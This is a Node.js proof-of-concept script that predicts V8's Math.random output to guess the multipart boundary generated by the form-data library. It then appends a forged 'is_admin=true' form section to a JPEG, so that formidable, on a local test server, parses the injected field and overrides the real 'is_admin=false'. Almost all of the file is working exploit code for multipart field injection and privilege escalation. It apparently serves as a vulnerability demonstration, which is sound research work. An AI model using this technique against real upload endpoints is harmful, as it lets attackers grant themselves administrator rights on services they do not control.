const http = require("http");
const IncomingForm = require("formidable").IncomingForm;
const predictV8Randomness = require("predict-v8-randomness");
const path = require("path");
const FormData = require("form-data");
const fs = require("fs");

const port = 5000;
const rootDir = __dirname;

const initialSequence = [
  Math.random(),
  Math.random(),
  Math.random(),
  Math.random(),
];
const predictor = new predictV8Randomness.Predictor(initialSequence);
predictor.predictNext(24).then(function (next24RandomOutputs) {
  const predictedBoundary = next24RandomOutputs
    .map(function (v) {
      return Math.floor(v * 10).toString(16);
    })
    .join("");

  const boundaryIntro = "----------------------------";
  const boundary = boundaryIntro + predictedBoundary;
  const injectedPayload =
    "\r\n" +
    boundary +
    '\r\nContent-Disposition: form-data; name="is_admin"\r\n\r\ntrue\r\n' +
    boundary +
    "--\r\n";

  server.listen(port, () => {
    // Read the image file
    const imagePath = path.join(rootDir, "cabo-pero.jpeg");
    const imageStream = fs.createReadStream(imagePath);

    // Create a PassThrough stream to append the injected payload after the image
    const { PassThrough } = require("stream");
    const combinedStream = new PassThrough();

    imageStream.on("end", () => {
      combinedStream.write(injectedPayload);
      combinedStream.end();
    });

    imageStream.pipe(combinedStream, { end: false });

    // Save combined stream to a new jpeg file
    const injectedImagePath = path.join(rootDir, "cabo-pero-injected.jpeg");
    const fileWriteStream = fs.createWriteStream(injectedImagePath);
    combinedStream.pipe(fileWriteStream);

    fileWriteStream.on("finish", () => {
      // This normal
      // const imageData = fs.readFileSync(imagePath);
      // This override server side fields
      const imageData = fs.readFileSync(injectedImagePath);

      const form = new FormData();

      // Append the image field with the combined stream
      form.append("my_field", imageData, {
        filename: "cabo-pero.jpeg",
        contentType: "image/jpeg",
      });

      form.append("is_admin", "false");

      form.submit(`http://localhost:${port}/`, (err, res) => {
        if (err) {
          throw err;
        }

        // unstuck new streams
        res.resume();

        server.close();
      });
    });
  });
});

const server = http.createServer((req, res) => {
  const incomingForm = new IncomingForm({
    keepExtensions: true,
  });
  incomingForm.parse(req);

  incomingForm
    .on("field", function (name, value) {
      console.log(`Field: ${name} = ${value}`);
    })
    .on("file", function (name, file) {
      console.log(`File: ${name} = ${file.originalFilename}`);
    })
    .on("end", function () {
      console.log("Form parsing completed.");

      res.writeHead(200);
      res.end("done");
    });
});

process.on("exit", function () {
  console.log("Process exiting, closing server...");
});
